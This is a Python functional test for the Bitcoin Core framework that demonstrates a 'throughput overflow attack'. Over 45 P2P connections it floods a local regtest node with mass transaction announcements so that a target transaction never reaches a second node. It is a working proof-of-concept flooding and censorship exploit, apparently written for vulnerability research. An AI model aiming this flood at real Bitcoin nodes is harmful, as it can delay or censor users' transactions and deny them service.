#!/usr/bin/env python3
# Copyright (c) 2023 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.

"""Test Throughput Overflow Attack"""

import time
import threading

from test_framework.key import (
        ECKey
)

from test_framework.messages import (
        CTransaction,
        CTxIn,
        CTxInWitness,
        CTxOut,
        COutPoint,
        sha256,
        COIN,
        tx_from_hex,
        msg_inv,
)

from test_framework.util import (
        assert_equal,
        assert_raises_rpc_error,
        p2p_port
)

from test_framework.messages import (
    CInv,
    MSG_TX,
    MSG_TYPE_MASK,
    MSG_WTX,
    msg_inv,
    msg_notfound,
    msg_tx,
)

from test_framework.script import (
        CScript,
        hash160,
        OP_IF,
        OP_HASH160,
        OP_EQUAL,
        OP_ELSE,
        OP_ENDIF,
        OP_CHECKSIG,
        OP_SWAP,
        OP_SIZE,
        OP_NOTIF,
        OP_DROP,
        OP_CHECKMULTISIG,
        OP_EQUALVERIFY,
        OP_0,
        OP_2,
        OP_TRUE,
        SegwitV0SignatureHash,
        SIGHASH_ALL,
        SIGHASH_SINGLE,
        SIGHASH_ANYONECANPAY,
)

from test_framework.p2p import (
    P2PInterface,
    p2p_lock,
)

from test_framework.test_framework import BitcoinTestFramework

from test_framework.wallet import MiniWallet

MAX_PEER_TX_ANNOUNCEMENTS = 5000

class TestP2PConn(P2PInterface):
    def __init__(self, wtxidrelay=True):
        super().__init__(wtxidrelay=wtxidrelay)
        self.tx_getdata_count = 0
        self.tx_announcement_count = 0
        self.tx_store = {}
        self.getdata_requests = []
        self.conn_index = 0

    def on_getdata(self, message):
        for i in message.inv:
            if i.type & MSG_TYPE_MASK == MSG_TX or i.type & MSG_TYPE_MASK == MSG_WTX:
                self.tx_getdata_count += 1
                if i.hash in self.tx_store.keys():
                    self.send_message(msg_tx(self.tx_store[i.hash]))
                if self.tx_getdata_count % 1000 == 0:
                    print("p2p conn index {0} getdata count {1}".format(self.conn_index, self.tx_getdata_count))
                if self.tx_getdata_count == MAX_PEER_TX_ANNOUNCEMENTS:
                    print("p2p conn index {0} max peer tx announcements reached".format(self.conn_index))

    def add_tx_store(self, tx, identifier):
        with p2p_lock:
                self.tx_store[identifier] = tx

MAX_PEER_TX_ANNOUNCEMENTS = 5000

def fan_out_coins(wallet, coins):

    fan_out_txn = []

    witness_script = CScript([OP_TRUE])
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    #fan_out_fee = 158

    # max coins scanned = 49
    assert_equal(len(coins), 49)

    for i in range(49):

        coin = coins.pop()
        fan_out_tx = CTransaction()
        fan_out_tx.vin.append(CTxIn(COutPoint(int(coin['txid'], 16), coin['vout']), b""))
        for i in range(2300):
            fan_out_tx.vout.append(CTxOut(int(4000), script_pubkey))
        fan_out_tx.rehash()

        wallet.sign_tx(fan_out_tx)

        fan_out_txn.append(fan_out_tx)

    assert_equal(len(fan_out_txn), 49)

    return fan_out_txn

def generate_target_tx(parent_txid):

    witness_script = CScript([OP_TRUE])
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    fee_sub = 200

    child_tx = CTransaction()
    child_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), 0), b""))
    child_tx.vout.append(CTxOut(int(4000 - fee_sub), script_pubkey))

    child_tx.wit.vtxinwit.append(CTxInWitness())
    child_tx.wit.vtxinwit[0].scriptWitness.stack = [witness_script]

    child_tx.rehash()

    return child_tx

def generate_flood_txn(parent_txids):

    child_txn = []

    witness_script = CScript([OP_TRUE])
    witness_program = sha256(witness_script)
    script_pubkey = CScript([OP_0, witness_program])

    fee_sub = 1000

    number_parent_txids = len(parent_txids)

    for parent_txid in parent_txids:
        for i in range(2300):
            child_tx = CTransaction()
            child_tx.vin.append(CTxIn(COutPoint(int(parent_txid, 16), i), b""))
            child_tx.vout.append(CTxOut(int(4000 - fee_sub), script_pubkey))

            child_tx.wit.vtxinwit.append(CTxInWitness())
            child_tx.wit.vtxinwit[0].scriptWitness.stack = [witness_script]

            child_tx.rehash()
            child_txn.append(child_tx)

    assert_equal(len(child_txn), number_parent_txids * 2300)

    return child_txn

def configure_txn_feeder(fan_out_txids, peer):
    flood_txn = generate_flood_txn(fan_out_txids)

    print("We have generated that many flood txn...")
    print(len(flood_txn))

    # We preload all the mass of txn in the peer tx store
    for one_tx in flood_txn:
        wtxid = int(one_tx.getwtxid(), 16)
        peer.add_tx_store(one_tx, wtxid)

    return flood_txn

# peer, txn_set
def txn_feeder(mass_txn, peer):
    # -> INV
    # <- GETDATA
    # -> TX  
    for one_tx in mass_txn:
        wtxid = int(one_tx.getwtxid(), 16)
        peer.send_message(msg_inv([CInv(t=MSG_WTX, h=wtxid)]))
        peer.tx_announcement_count += 1

    #peer.wait_until(lambda: peer.tx_getdata_count == expectations)
    print("Txn feeder done")

def alice_node_mempool_status(node):
    for i in range(10):
        time.sleep(1)
        print("Alice's mempool txn {0}".format(len(node.getrawmempool())))

def bob_node_mempool_status(node):
    for i in range(10):
        time.sleep(1)
        print("Bob's mempool txn {0}".format(len(node.getrawmempool())))

def open_connections(node, init_index, number_connections):
    peer_list = []
    for i in range(number_connections):
        conn = TestP2PConn()
        conn.conn_index = init_index
        peer = node.add_p2p_connection(conn)
        init_index += 1
        peer_list.append(peer)
    return peer_list

def configure_feeder_threads(peer_list, fan_out_txids, batch_size):
    thread_list = []
    i = 0
    for peer in peer_list:
        subset_fan_out_txids = fan_out_txids[i:i+batch_size]
        flood_txn = configure_txn_feeder(subset_fan_out_txids, peer)
        feeder_thread = threading.Thread(target=txn_feeder, args=(flood_txn, peer))
        i += 1
        thread_list.append(feeder_thread)
    return thread_list

class ThroughputOverflowAttackTest(BitcoinTestFramework):

    def set_test_params(self):
        self.num_nodes = 2

    def test_throughput_overflow_attack(self):
        alice = self.nodes[0]
        bob = self.nodes[1]

        # Alice <-> Bob
        self.connect_nodes(0, 1)

        assert_equal(len(bob.getpeerinfo()), 2)

        self.generate(alice, 101)

        self.sync_all()

        wallet = self.wallet
        self.wallet.rescan_utxos()

        peer_list = open_connections(alice, 1, 45)
 
        print("Alice number of peers {0}".format(len(alice.getpeerinfo())))

        for peer in alice.getpeerinfo():
            print("peer {0} addr {1}".format(peer['id'], peer['addr']))
 
        utxos = self.wallet.get_utxos(mark_as_spent=True)
        assert_equal(len(utxos), 49)

        print("Rescanned unique UTXOs")

        fan_out_txn = fan_out_coins(wallet, utxos)

        fan_out_txids = []
        for tx in fan_out_txn:
            txid = alice.sendrawtransaction(tx.serialize_with_witness().hex(), 0)
            fan_out_txids.append(txid)

        assert_equal(len(fan_out_txids), 49)

        self.sync_all()

        assert_equal(len(alice.getrawmempool()), 49)
        assert_equal(len(bob.getrawmempool()), 49)

        self.generate(alice, 101)

        self.sync_all()

        ## 'effective-feerate' : Decimal('0.00010416')
        #ret = alice.testmempoolaccept([flood_txn[0].serialize_with_witness().hex()])[0]

        target_tx = generate_target_tx(fan_out_txids[47])

        # 'effective-feerate' : Decimal('0.00002083')
        #ret = alice.testmempoolaccept([target_tx.serialize_with_witness().hex()])[0]

        thread_list = configure_feeder_threads(peer_list, fan_out_txids, 1)

        assert_equal(len(bob.getpeerinfo()), 2)

        for feeder_thread in thread_list:
            feeder_thread.start()

        for feeder_thread in thread_list:
            feeder_thread.join()

        for i in range(60):
            time.sleep(1)
            print("At second {0}".format(i))
            print("Alice's mempool txn {0}".format(len(alice.getrawmempool())))
            print("Bob's mempool txn {0}".format(len(bob.getrawmempool())))

            if i == 10:
                print("Alice broadcast the target tx")
                alice.sendrawtransaction(target_tx.serialize_with_witness().hex())

            if target_tx.hash in bob.getrawmempool():
                print("target tx succeeded in bob mempool")
                break

        assert target_tx.hash in alice.getrawmempool()
        assert target_tx.hash not in bob.getrawmempool()
        success = alice.getmempoolentry(target_tx.hash)
        print(success)
        assert_raises_rpc_error(-5, "Transaction not in mempool", bob.getmempoolentry, target_tx.hash)

    def run_test(self):
        self.wallet = MiniWallet(self.nodes[0])

        self.test_throughput_overflow_attack()

if __name__ == '__main__':
    ThroughputOverflowAttackTest().main()
